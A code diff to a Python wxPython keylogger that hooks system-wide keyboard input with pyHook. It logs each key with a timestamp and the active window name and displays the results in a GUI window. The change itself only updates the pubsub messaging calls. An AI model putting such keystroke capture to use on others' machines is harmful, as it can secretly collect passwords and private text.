@@ -1,5 +1,4 @@
 import pythoncom
-#import win32gui
 import os
 import pyHook
 import time
@@ -8,7 +7,10 @@ import win32con
 import wx
 import threading
 import sys
-from wx.lib.pubsub import Publisher
+from wx.lib.pubsub import setuparg1
+from wx.lib.pubsub import pub
+
+Publisher = pub.Publisher()
 
 ID_MENU_NEW = wx.NewId()
 ID_MENU_OPEN = wx.NewId()
@@ -159,7 +161,7 @@ class Keylogger(wx.Frame):
         self.keyTrack.setDaemon(True)
         self.keyTrack.start()
         #create a pubsub receiver
-        Publisher().subscribe(self.updateDisplay, "update")
+        Publisher.subscribe(self.updateDisplay, "update")
 
         #iconize settting
         self.taskBarIcon = TaskBarIcon(self)
@@ -233,14 +235,14 @@ def onKeyboardEvent(event):
         changewindow = False
         asciistr = asciistr + chr(event.Ascii)
         keystr = keystr + str(event.Key)
-        wx.CallAfter(Publisher().sendMessage, "update", (keytime, appname, asciistr, keystr))
+        wx.CallAfter(Publisher.sendMessage, "update", (keytime, appname, asciistr, keystr))
     else:
         changewindow = True
         appname = str(event.WindowName)
         asciistr = chr(event.Ascii)
         keystr = str(event.Key)
         keytime = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
-        wx.CallAfter(Publisher().sendMessage, "update", (keytime, appname, asciistr, keystr))
+        wx.CallAfter(Publisher.sendMessage, "update", (keytime, appname, asciistr, keystr))
         keyrecord.append((keytime, appname, asciistr, keystr))
     return True
 
